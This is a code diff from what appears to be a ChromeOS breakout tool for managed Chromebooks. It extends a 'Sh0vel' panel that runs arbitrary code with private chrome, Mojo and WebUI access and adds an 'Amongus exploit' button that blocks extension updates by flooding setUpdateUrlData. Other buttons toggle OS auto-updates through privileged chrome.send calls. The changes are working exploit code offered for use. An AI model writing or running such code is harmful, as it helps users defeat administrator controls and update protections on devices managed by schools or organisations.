@@ -35,7 +35,8 @@ chrome.runtime.getBackgroundPage((background) => {
 				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
 				const asPage=function(code) {
 					let link=window.open('about:blank','_blank');
-					link.location.href=`javascript:(function() {
+					link.location.href=`javascript:
+					(function() {
 						chrome=opener.chrome;
 						console=opener.console;
 						if (opener.Mojo) {
@@ -44,7 +45,8 @@ chrome.runtime.getBackgroundPage((background) => {
 							window.chromeos=opener.chromeos;
 						}
 						${code}
-					})();`;	
+					})();
+					`;	
 					/* We don't call link.close here as some callbacks need to run before closing, so
 					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
 				}
@@ -87,7 +89,7 @@ chrome.runtime.getBackgroundPage((background) => {
 								<p>
 									Zeglol1234: The idea, main developer<br>
 									Writable: Skiovox Breakout implementations (Not affiliated with this project directly)<br>
-									Bypassi: Add gmails exploit (Not affiliated with this project directly)<br>
+									Bypassi: Add gmails bug and amongus exploit (Not affiliated with this project directly)<br>
 									Notboeing747: Misc development and testing<br>
 									Kxtz: Misc development and testing<br>
 									Archimax: GUI inspiration<br>
@@ -174,7 +176,7 @@ chrome.runtime.getBackgroundPage((background) => {
 								border: 3px solid white;
 								display: inline-block;
 							}
-							#extOutBox, #pageOutBox{
+							#extOutBox, #pageOutBox, #pbOutBox{
 								height: 200px;
 								width: 200px;
 								color: white;
@@ -496,12 +498,20 @@ chrome.runtime.getBackgroundPage((background) => {
 					<hr>
 					<p>Run code with direct access to this page's chrome API via Sh0vel. Access this page's DOM with window.opener.</p>
 					<br>
-					<textarea spellcheck="false" class="evalBox id="pbEvalBox"></textarea>
+					<textarea spellcheck="false" class="evalBox" id="pbEvalBox"></textarea>
+					<div id="pbOutBox"></div>
 					<br>
 					<button id="pbEvalButton">Run as Sh0vel</button>
+					<button id="consClear">Clear Output</button>
 					`;
 					pbEvalBox.querySelector('#pbEvalButton').addEventListener('click', () => {
-						asPage(document.querySelector('#pbEvalBox').value);
+						asPage(`console.log=function(log) {
+							opener.document.querySelector('#pbOutBox').append(JSON.stringify(log));
+							opener.document.querySelector('#pbOutBox').append(document.createElement('br'));
+						};` + document.querySelector('#pbEvalBox').value);
+					});
+					pbEvalBox.querySelector('#consClear').addEventListener('click', () => {
+						document.querySelector('#pbOutBox').innerHTML="Console Was Cleared.<br>";
 					});
 					container.append(pbEvalBox);
 
@@ -667,7 +677,7 @@ chrome.runtime.getBackgroundPage((background) => {
 						<br>
 						<h1>Update Manager</h1>
 						<hr>
-						<p>Force, Disable, and Enable automatic updates for the OS.</p>
+						<p>Force, Disable, and Enable automatic updates for the OS or Extension.</p>
 						<button id="updateOS">Update System</button>
 						<button id="caub">Disable Consumer Autoupdates</button>
 						<button id="uncaub">Enable Consumer Autoupdates</button>
@@ -681,6 +691,18 @@ chrome.runtime.getBackgroundPage((background) => {
 						updateBox.querySelector('#uncaub').addEventListener('click', () => {
 							asPage("chrome.send('setConsumerAutoUpdate', ['true']);window.close();");
 						});
+
+						let update_url=chrome.runtime.getManifest().update_url;
+						if (update_url !== undefined && !update_url.includes("clients2.google.com")) {
+							let extCaub=document.createElement('button');
+							extCaub.innerText="Prevent Extension Updating (Amongus Exploit)";
+							extCaub.addEventListener('click', () => {
+								asExt("chrome.extension.setUpdateUrlData('ඞ'.repeat(1024));");
+							});
+
+							updateBox.append(extCaub);
+						}
+						
 						container.append(updateBox);
 					}
 					if (perms.includes("restart")) {
